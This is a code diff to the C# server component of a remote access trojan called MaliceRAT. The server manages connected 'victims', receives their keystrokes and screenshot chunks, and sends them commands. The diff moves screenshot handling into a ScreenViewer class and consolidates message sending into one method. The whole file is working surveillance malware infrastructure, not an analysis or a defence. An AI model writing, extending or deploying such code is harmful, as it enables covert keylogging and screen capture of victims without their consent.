@@ -13,13 +13,19 @@ namespace MaliceRAT.RatServer
 {
     public class Server
     {
+        #region Features
+        public ScreenViewer screenViewer = new ScreenViewer();
+        #endregion
+
+        #region Events
         public event Action<string> MessageReceived;
         public event Action<Victim> InfoReceived;
         public event Action<Victim> ClientConnected;
         public event Action<Victim> ClientDisconnected;
-        public event Action<byte[]> ScreenshotReceived;
         public event Action<Victim, string> KeystrokeReceived;
+        #endregion
 
+        #region Variables
         private dynamic config;
         private TcpListener server;
         private int BufferSize;
@@ -28,17 +34,17 @@ namespace MaliceRAT.RatServer
         private int Port;
         public List<Victim> victims = new List<Victim>();
         private Dictionary<int, Task> clientTasks = new Dictionary<int, Task>();
-        private StringBuilder screenshotBuilder = new StringBuilder();
         private JavaScriptSerializer serializer = new JavaScriptSerializer();
         // Console
         [DllImport("kernel32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         static extern bool AllocConsole();
+        #endregion
 
+        #region Constructor
         public Server()
         {
             AllocConsole();
-            // Config
             string configPath = Path.Combine(Application.StartupPath, "config.json");
             if (File.Exists(configPath))
             {
@@ -58,6 +64,7 @@ namespace MaliceRAT.RatServer
                 Application.Exit();
             }
         }
+        #endregion
 
         public void StartServer()
         {
@@ -138,14 +145,7 @@ namespace MaliceRAT.RatServer
                         }
                         else if (jsonMessage["type"] == "screenshot_chunk")
                         {
-                            screenshotBuilder.Append(jsonMessage["data"].ToString());
-                            if (jsonMessage["final"] == true)
-                            {
-                                byte[] screenshotData = Convert.FromBase64String(screenshotBuilder.ToString());
-                                Console.WriteLine("Complete screenshot received from client: " + client.IP);
-                                OnScreenshotReceived(screenshotData);
-                                screenshotBuilder.Clear();
-                            }
+                            screenViewer.HandleScreenshotChunk(jsonMessage["data"].ToString(), jsonMessage["final"]);
                         }
                         else if (jsonMessage["type"] == "stop_screenshots")
                         {
@@ -169,22 +169,6 @@ namespace MaliceRAT.RatServer
                 OnClientDisconnected(client);
             }
         }
-        public void DisconnectClient(int id)
-        {
-            Victim client = null;
-            foreach (var v in victims)
-            {
-                if (v.Id == id)
-                {
-                    client = v;
-                    break;
-                }
-            }
-            if (client != null)
-            {
-                client.TcpClient.Close();
-            }
-        }
 
         protected virtual void OnMessageReceived(string message)
         {
@@ -204,24 +188,14 @@ namespace MaliceRAT.RatServer
             Console.WriteLine("Client disconnected: " + client.IP);
             ClientDisconnected?.Invoke(client);
         }
-
-        protected virtual void OnScreenshotReceived(byte[] screenshotData)
-        {
-            ScreenshotReceived?.Invoke(screenshotData);
-        }
-
+        
         private async Task SendHeartbeat(NetworkStream stream)
         {
-            var heartbeat = new
+            var heartbeat = new { type = "heartbeat", text = "ping" };
+            Victim client = victims.Find(v => v.TcpClient.GetStream() == stream);
+            if (client != null)
             {
-                type = "heartbeat",
-                text = "ping"
-            };
-            string jsonHeartbeat = serializer.Serialize(heartbeat);
-            byte[] heartbeatBytes = Encoding.UTF8.GetBytes(jsonHeartbeat);
-            if (stream.CanWrite)
-            {
-                await stream.WriteAsync(heartbeatBytes, 0, heartbeatBytes.Length);
+                await Task.Run(() => SendMessageTo(client, heartbeat));
             }
         }
 
@@ -230,58 +204,11 @@ namespace MaliceRAT.RatServer
             return victims.Find(v => v.Id == id);
         }
 
-        public void SetScreenUpdateInterval(int clientId, int interval)
+        public void SendMessageTo(Victim client, object message)
         {
-            Victim client = victims.Find(v => v.Id == clientId);
-            if (client != null)
-            {
-                string message;
-                if (interval > 0)
-                {
-                    message = serializer.Serialize(new { type = "set_interval", interval = interval });
-                }
-                else
-                {
-                    message = serializer.Serialize(new { type = "stop_screenshots" });
-                }
-                SendMessageToClient(client, message);
-            }
-        }
-
-        private void SendMessageToClient(Victim client, string message)
-        {
-            byte[] data = Encoding.UTF8.GetBytes(message);
+            string jsonMessage = serializer.Serialize(message);
+            byte[] data = Encoding.UTF8.GetBytes(jsonMessage);
             client.TcpClient.GetStream().Write(data, 0, data.Length);
-        }
-
-        public void RequestScreenshot(int clientId)
-        {
-            Victim client = GetVictimById(clientId);
-            if (client != null)
-            {
-                // Temporarily set a very short interval to trigger an immediate screenshot
-                string startMessage = serializer.Serialize(new { type = "set_interval", interval = 1 });
-                SendMessageToClient(client, startMessage);
-
-                System.Timers.Timer timer = new System.Timers.Timer(100);
-                timer.Elapsed += (sender, args) =>
-                {
-                    string stopMessage = serializer.Serialize(new { type = "stop_screenshots" });
-                    SendMessageToClient(client, stopMessage);
-                    timer.Stop();
-                };
-                timer.Start();
-            }
-        }
-
-        public void SendJson(int clientId, object jsonObject)
-        {
-            Victim client = GetVictimById(clientId);
-            if (client != null)
-            {
-                string jsonString = serializer.Serialize(jsonObject);
-                SendMessageToClient(client, jsonString);
-            }
         }
     }
 }
